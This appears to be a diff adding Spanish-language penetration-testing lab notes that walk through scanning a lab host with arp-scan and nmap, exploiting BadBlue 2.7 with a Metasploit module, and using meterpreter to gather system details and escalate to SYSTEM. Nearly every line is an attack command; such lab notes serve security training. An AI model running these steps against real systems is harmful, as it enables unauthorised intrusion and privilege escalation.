@@ -1,0 +1,38 @@
+- escanear ip
+
+# arp-scan 10.0.2.0/24
+
+- escanear servicios en la máquina objetivo
+# nmap -sS -n -Pn 10.0.2.4
+
+- escanear version de servicio en puerto 80
+# nmap -sV -p 80 10.0.2.4
+
+- Arrancar metaspliot
+#msfconsole
+
+- buscar exploit
+>search badblue 2.7
+
+- seleccionar exploit
+>use /exploit/windows/http/badblue_passthru
+
+- configurar ip del objetivo
+>set rhosts 10.0.2.4
+
+- Ejecutar exploit
+>run
+
+-postexplotación
+Dentro de meterpreter
+
+- ver usuario
+>getuid
+
+- ver sistema
+>sysinfo
+
+- escalar privilegios
+>getsystem
+
+>getuid
